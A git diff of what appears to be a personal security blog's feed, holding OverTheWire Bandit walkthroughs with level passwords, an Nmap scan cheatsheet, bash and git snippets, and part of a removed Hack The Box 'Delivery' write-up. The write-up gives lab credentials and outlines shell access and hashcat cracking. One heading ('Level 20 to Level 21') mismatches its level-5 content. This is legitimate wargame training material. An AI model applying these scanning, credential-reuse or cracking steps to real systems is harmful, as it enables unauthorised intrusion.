+&lt;h2 id=&quot;level-20-to-level-21&quot;&gt;Level 20 to Level 21&lt;/h2&gt;
+
+&lt;h3 id=&quot;the-levels-statement-2&quot;&gt;THE LEVEL’S STATEMENT&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;**&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;commands-2&quot;&gt;COMMANDS&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;cd     - change working directory.&lt;/em&gt;
+                                                                                                                                                                           &amp;gt;
+&lt;em&gt;cat    - concatenate files and print on the standard output.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;file   - determine file type.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;du     - estimate file space usage.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;find   - search for files in a directory hierarchy.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;solution-2&quot;&gt;SOLUTION&lt;/h2&gt;
+
+&lt;p&gt;View files that are in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inhere&lt;/code&gt; directory.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit5@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;inhere
+bandit5@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;inhere/
+bandit5@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;maybehere00  maybehere03  maybehere06  maybehere09  maybehere12  maybehere15  maybehere18
+maybehere01  maybehere04  maybehere07  maybehere10  maybehere13  maybehere16  maybehere19
+maybehere02  maybehere05  maybehere08  maybehere11  maybehere14  maybehere17
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To search for the file that we require using the properties that are specified in the question we can make use of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit5@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-size&lt;/span&gt; 1033c &lt;span class=&quot;nt&quot;&gt;-not&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-executable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; file &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; + | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;ASCII
+./maybehere07/.file2: ASCII text, with very long lines
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+  &lt;h3 id=&quot;command-explanation&quot;&gt;Command Explanation&lt;/h3&gt;
+  &lt;ul&gt;
+    &lt;li&gt;. : Search the current working directory only&lt;/li&gt;
+    &lt;li&gt;-type f : Look for files only (Exclude Directories)&lt;/li&gt;
+    &lt;li&gt;-size 1033c : Look for files that are exactly 1033 bytes in size (Find uses “c” to represent bytes)&lt;/li&gt;
+    &lt;li&gt;-not -executable : Find only non executable files&lt;/li&gt;
+    &lt;li&gt;-exec file {} + : Execute the file command on all the results returns by find&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; {} is an placeholder for the location where the names of the files found by find is going to be substituted. The “+” sign is used to terminate the statemen.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;From the previous level we know that file command will return value “ASCII Text” for human readable files. So by using grep we are filtering the output to only show results with that contain that string. 
+The pipe (|) operator is used to pass the output of one command as the input of another command. 
+Finally we print the content of the file.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./maybehere07/.file2
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We have found the password for the next level!&lt;/p&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="OverTheWire" /><category term="bandit," /><category term="bash" /><summary type="html">https://overthewire.org/wargames/bandit/</summary></entry><entry><title type="html">Bandit (6 to 9)</title><link href="http://localhost:4000/bandit-6-to-9/" rel="alternate" type="text/html" title="Bandit (6 to 9)" /><published>2021-08-29T00:00:00+02:00</published><updated>2021-08-29T00:00:00+02:00</updated><id>http://localhost:4000/bandit-6-to-9</id><content type="html" xml:base="http://localhost:4000/bandit-6-to-9/">&lt;p&gt;&lt;img src=&quot;../assets/images/overthewire.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;level-6-to-level-7&quot;&gt;Level 6 to Level 7&lt;/h2&gt;
 
@@ -12,7 +801,7 @@
 &lt;em&gt;- 33 bytes in size&lt;/em&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h3 id=&quot;commands&quot;&gt;COMMANDS&lt;/h3&gt;
+&lt;h3 id=&quot;commands-you-may-need&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
@@ -93,7 +882,7 @@ HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
   &lt;p&gt;*The password for the next level is stored in the file data.txt next to the word millionth. *&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h3 id=&quot;commands-1&quot;&gt;COMMANDS&lt;/h3&gt;
+&lt;h3 id=&quot;commands-you-may-need-1&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;&lt;em&gt;grep             - print lines that match patterns.&lt;/em&gt;&lt;/p&gt;
@@ -167,7 +956,7 @@ millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV
   &lt;p&gt;&lt;em&gt;The password for the next level is stored in the file data.txt and is the only line of text that occurs only once.&lt;/em&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h3 id=&quot;commands-2&quot;&gt;COMMANDS&lt;/h3&gt;
+&lt;h3 id=&quot;commands-you-may-need-2&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;&lt;em&gt;grep             - print lines that match patterns.&lt;/em&gt;&lt;/p&gt;
@@ -219,7 +1008,7 @@ millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit8@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="OverTheWire" /><category term="bandit" /><summary type="html">https://overthewire.org/wargames/bandit/</summary></entry><entry><title type="html">Bandit from level 0 to level 3</title><link href="http://localhost:4000/bandit-0-to-3/" rel="alternate" type="text/html" title="Bandit from level 0 to level 3" /><published>2021-08-24T00:00:00+02:00</published><updated>2021-08-24T00:00:00+02:00</updated><id>http://localhost:4000/bandit-0-to-3</id><content type="html" xml:base="http://localhost:4000/bandit-0-to-3/">&lt;p&gt;&lt;img src=&quot;../assets/images/overthewire.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="OverTheWire" /><category term="bandit," /><category term="bash" /><summary type="html">https://overthewire.org/wargames/bandit/</summary></entry><entry><title type="html">Bandit (0 to 3)</title><link href="http://localhost:4000/bandit-0-to-3/" rel="alternate" type="text/html" title="Bandit (0 to 3)" /><published>2021-08-24T00:00:00+02:00</published><updated>2021-08-24T00:00:00+02:00</updated><id>http://localhost:4000/bandit-0-to-3</id><content type="html" xml:base="http://localhost:4000/bandit-0-to-3/">&lt;p&gt;&lt;img src=&quot;../assets/images/overthewire.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;level-0-to-level-1&quot;&gt;Level 0 to Level 1&lt;/h2&gt;
 
@@ -228,7 +1017,7 @@ UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
   &lt;p&gt;&lt;em&gt;The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.&lt;/em&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h3 id=&quot;commands&quot;&gt;COMMANDS&lt;/h3&gt;
+&lt;h3 id=&quot;commands-you-may-need&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
@@ -274,7 +1063,7 @@ boJ9jbbUNNfktd78OOpsqOltutMc3MY1
   &lt;p&gt;&lt;em&gt;The password for the next level is stored in a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;—&lt;/code&gt; located in the home directory&lt;/em&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h3 id=&quot;commands-1&quot;&gt;COMMANDS&lt;/h3&gt;
+&lt;h3 id=&quot;commands-you-may-need-1&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
@@ -321,7 +1110,7 @@ CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
   &lt;p&gt;&lt;em&gt;The password for the next level is stored in a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spaces in this filename&lt;/code&gt; located in the home directory.&lt;/em&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h3 id=&quot;commands-2&quot;&gt;COMMANDS&lt;/h3&gt;
+&lt;h3 id=&quot;commands-you-may-need-2&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
@@ -359,7 +1148,7 @@ UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
 bandit2@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;spaces in this filename&quot;&lt;/span&gt;
 UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;We have found the password for the next level !&lt;/p&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="OverTheWire" /><category term="bandit" /><summary type="html">https://overthewire.org/wargames/bandit/</summary></entry><entry><title type="html">Bandit from level 3 to level 6</title><link href="http://localhost:4000/bandit-3-to-6/" rel="alternate" type="text/html" title="Bandit from level 3 to level 6" /><published>2021-08-24T00:00:00+02:00</published><updated>2021-08-24T00:00:00+02:00</updated><id>http://localhost:4000/bandit-3-to-6</id><content type="html" xml:base="http://localhost:4000/bandit-3-to-6/">&lt;p&gt;&lt;img src=&quot;../assets/images/overthewire.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We have found the password for the next level !&lt;/p&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="OverTheWire" /><category term="bandit," /><category term="bash" /><summary type="html">https://overthewire.org/wargames/bandit/</summary></entry><entry><title type="html">Bandit (3 to 6)</title><link href="http://localhost:4000/bandit-3-to-6/" rel="alternate" type="text/html" title="Bandit (3 to 6)" /><published>2021-08-24T00:00:00+02:00</published><updated>2021-08-24T00:00:00+02:00</updated><id>http://localhost:4000/bandit-3-to-6</id><content type="html" xml:base="http://localhost:4000/bandit-3-to-6/">&lt;p&gt;&lt;img src=&quot;../assets/images/overthewire.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;level-3-to-level-4&quot;&gt;Level 3 to Level 4&lt;/h2&gt;
 
@@ -369,7 +1158,7 @@ UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
   &lt;p&gt;&lt;em&gt;The password for the next level is stored in a hidden file in the inhere directory.&lt;/em&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h3 id=&quot;commands&quot;&gt;COMMANDS&lt;/h3&gt;
+&lt;h3 id=&quot;commands-you-may-need&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
@@ -426,7 +1215,7 @@ UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
 &lt;em&gt;Tip: if your terminal is messed up, try the “reset” command.&lt;/em&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h3 id=&quot;commands-1&quot;&gt;COMMANDS&lt;/h3&gt;
+&lt;h3 id=&quot;commands-you-may-need-1&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
@@ -497,7 +1286,7 @@ koReBOKuIDDepwhWk7jZC0RTdopnAYKh
 &lt;em&gt;- not executable&lt;/em&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h3 id=&quot;commands-2&quot;&gt;COMMANDS&lt;/h3&gt;
+&lt;h3 id=&quot;commands-you-may-need-2&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
@@ -560,7 +1349,7 @@ Finally we print the content of the file.&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./maybehere07/.file2
 DXjZPULLxYr17uwoI01bNLQbtFemEgo7
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;We have found the password for the next level!&lt;/p&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="OverTheWire" /><category term="bandit" /><summary type="html">https://overthewire.org/wargames/bandit/</summary></entry><entry><title type="html">Nmap cheatsheet</title><link href="http://localhost:4000/nmap-commands/" rel="alternate" type="text/html" title="Nmap cheatsheet" /><published>2021-08-19T00:00:00+02:00</published><updated>2021-08-19T00:00:00+02:00</updated><id>http://localhost:4000/nmap-commands</id><content type="html" xml:base="http://localhost:4000/nmap-commands/">&lt;h2 id=&quot;scan-techniques&quot;&gt;Scan techniques&lt;/h2&gt;
+&lt;p&gt;We have found the password for the next level!&lt;/p&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="OverTheWire" /><category term="bandit," /><category term="bash" /><summary type="html">https://overthewire.org/wargames/bandit/</summary></entry><entry><title type="html">Nmap cheatsheet</title><link href="http://localhost:4000/nmap-commands/" rel="alternate" type="text/html" title="Nmap cheatsheet" /><published>2021-08-19T00:00:00+02:00</published><updated>2021-08-19T00:00:00+02:00</updated><id>http://localhost:4000/nmap-commands</id><content type="html" xml:base="http://localhost:4000/nmap-commands/">&lt;h2 id=&quot;scan-techniques&quot;&gt;Scan techniques&lt;/h2&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	-sS	nmap 192.168.1.1 -sS	 	TCP SYN port scan (Default)
 -sT 		nmap 192.168.1.1 -sT 		TCP connect port scan (Default without root privilege). 
 	-sU	nmap 192.168.1.1 -sU	 	UDP port scan
@@ -591,316 +1380,11 @@ DXjZPULLxYr17uwoI01bNLQbtFemEgo7
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="apuntes" /><category term="nmap," /><category term="apunts" /><summary type="html">nmap -n -Pn -sT -p- --min-rate 3500 IP --open</summary></entry><entry><title type="html">Useful bash comands</title><link href="http://localhost:4000/useful-bash-commands/" rel="alternate" type="text/html" title="Useful bash comands" /><published>2021-08-18T00:00:00+02:00</published><updated>2021-08-18T00:00:00+02:00</updated><id>http://localhost:4000/useful-bash-commands</id><content type="html" xml:base="http://localhost:4000/useful-bash-commands/">&lt;h2 id=&quot;exclude-a-file-from-deletion&quot;&gt;Exclude a file from deletion&lt;/h2&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;*&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;important.txt&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><summary type="html">Repository of useful commands for the everyday bash usage.</summary></entry><entry><title type="html">Delivery - Hack The Box</title><link href="http://localhost:4000/htb-writeup-delivery/" rel="alternate" type="text/html" title="Delivery - Hack The Box" /><published>2021-05-22T00:00:00+02:00</published><updated>2021-05-22T00:00:00+02:00</updated><id>http://localhost:4000/htb-writeup-delivery</id><content type="html" xml:base="http://localhost:4000/htb-writeup-delivery/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/delivery_logo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><summary type="html">Repository of useful commands for the everyday bash usage.</summary></entry><entry><title type="html">Useful git comands</title><link href="http://localhost:4000/useful-git-commands/" rel="alternate" type="text/html" title="Useful git comands" /><published>2021-07-15T00:00:00+02:00</published><updated>2021-07-15T00:00:00+02:00</updated><id>http://localhost:4000/useful-git-commands</id><content type="html" xml:base="http://localhost:4000/useful-git-commands/">&lt;h2 id=&quot;update-github-repository&quot;&gt;Update github repository&lt;/h2&gt;
 
-&lt;p&gt;Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we’ll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we’ll use hashcat combined with rules to crack the password then get the root shell.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git add &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
 
-&lt;h2 id=&quot;portscan&quot;&gt;Portscan&lt;/h2&gt;
+git commit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Info about the update&quot;&lt;/span&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report for 10.129.148.141
-Host is up (0.018s latency).
-Not shown: 65532 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
-|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
-|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
-80/tcp   open  http    nginx 1.14.2
-|_http-server-header: nginx/1.14.2
-|_http-title: Welcome
-8065/tcp open  unknown
-| fingerprint-strings: 
-|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
-|     HTTP/1.1 400 Bad Request
-|     Content-Type: text/plain; charset=utf-8
-|     Connection: close
-|     Request
-|   GetRequest: 
-|     HTTP/1.0 200 OK
-|     Accept-Ranges: bytes
-|     Cache-Control: no-cache, max-age=31556926, public
-|     Content-Length: 3108
-|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
-|     Content-Type: text/html; charset=utf-8
-|     Last-Modified: Sun, 09 May 2021 00:00:02 GMT
-|     X-Frame-Options: SAMEORIGIN
-|     X-Request-Id: fqrpd5m3ftgnzmxkbieezqadxo
-|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
-|     Date: Sun, 09 May 2021 00:01:31 GMT
-|     &amp;lt;!doctype html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&quot;&amp;gt;&amp;lt;meta name=&quot;robots&quot; content=&quot;noindex, nofollow&quot;&amp;gt;&amp;lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&amp;gt;&amp;lt;title&amp;gt;Mattermost&amp;lt;/title&amp;gt;&amp;lt;meta name=&quot;mobile-web-app-capable&quot; content=&quot;yes&quot;&amp;gt;&amp;lt;meta name=&quot;application-name&quot; content=&quot;Mattermost&quot;&amp;gt;&amp;lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no&quot;&amp;gt;&amp;lt;link re
-|   HTTPOptions: 
-|     HTTP/1.0 405 Method Not Allowed
-|     Date: Sun, 09 May 2021 00:01:31 GMT
-|_    Content-Length: 0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;website&quot;&gt;Website&lt;/h2&gt;
-
-&lt;p&gt;The Delivery website is pretty basic, there’s a link to a vhost called helpdesk.delivery.htb and a contact us section. We’ll add this entry to our local host before proceeding further.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/website1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The contact us section tells us we need an @delivery.htb email address and tells us port 8065 is a MatterMost server. MatterMost is a Slack-like collaboration platform that can be self-hosted.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/website2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Browsing to port 8065 we get the MatterMost login page but we don’t have credentials yet&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;helpdesk&quot;&gt;Helpdesk&lt;/h2&gt;
-
-&lt;p&gt;The Helpdesk page uses the OsTicket web application. It allows users to create and view the status of ticket.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/helpdesk3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We can still open new tickets even if we only have a guest user.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/helpdesk1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;After a ticket has been created, the system generates a random @delivery.htb email account with the ticket ID.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/helpdesk2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Now that we have an email account we can create a MatterMost account.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A confirmation email is then sent to our ticket status inbox.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We use the check ticket function on the OsTicket application and submit the original email address we used when creating the ticket and the ticket ID.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We’re now logged in and we see that the MatterMost confirmation email has been added to the ticket information.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;To confirm the creation of our account we’ll just copy/paste the included link into a browser new tab.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;After logging in to MatterMost we have access to the Internal channel where we see that credentials have been posted. There’s also a hint that we’ll have to use a variation of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PleaseSubscribe!&lt;/code&gt; password later.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;user-shell&quot;&gt;User shell&lt;/h2&gt;
-
-&lt;p&gt;With the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maildeliverer / Youve_G0t_Mail!&lt;/code&gt; credentials we can SSH in and get the user flag.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/user.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;credentials-in-mysql-database&quot;&gt;Credentials in MySQL database&lt;/h2&gt;
-
-&lt;p&gt;After doing some recon we find the MatterMost installation directory in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/mattermost&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maildeliverer@Delivery:/opt/mattermost/config$ ps waux | grep -i mattermost
-matterm+   741  0.2  3.3 1649596 135112 ?      Ssl  20:00   0:07 /opt/mattermost/bin/mattermost
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.json&lt;/code&gt; file contains the password for the MySQL database:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
-&quot;SqlSettings&quot;: {
-        &quot;DriverName&quot;: &quot;mysql&quot;,
